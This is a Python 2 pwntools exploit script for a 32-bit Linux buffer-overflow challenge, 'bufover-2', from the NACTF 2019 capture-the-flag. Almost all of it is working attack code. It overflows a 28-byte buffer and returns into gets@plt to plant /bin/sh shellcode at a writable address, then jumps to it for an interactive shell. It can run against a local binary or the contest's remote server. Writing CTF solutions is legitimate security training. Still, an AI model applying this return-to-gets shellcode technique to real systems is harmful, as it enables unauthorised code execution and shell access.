#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
context.update(arch="i386", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/nactf/pwn/bof2/bufover-2")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    #attach(r)
    pop_ebx = 0x0804901e
    pop_esp = 0x08049363
    win = 0x080491c2
    args1 = 0x14B4DA55
    args2 = 0xF00DB4BE
    pop_ebx_esi_edi_ebp = 0x08049360
    sh = asm(shellcraft.sh())

    p = "A" * 28
    # p += p32(pop_ebx)
    # p += p32(args1)
    # p += p32(pop_esp)
    # p += p32(args2)
    # p += p32(win)
    # p += p32(0x0804922C)
    p += p32(0x08049040) # gets@plt
    p += p32(0x0804c034)
    p += p32(0x0804c034)
    
    r.sendline(p)
    r.sendline(sh)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("shell.2019.nactf.com", 31184)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
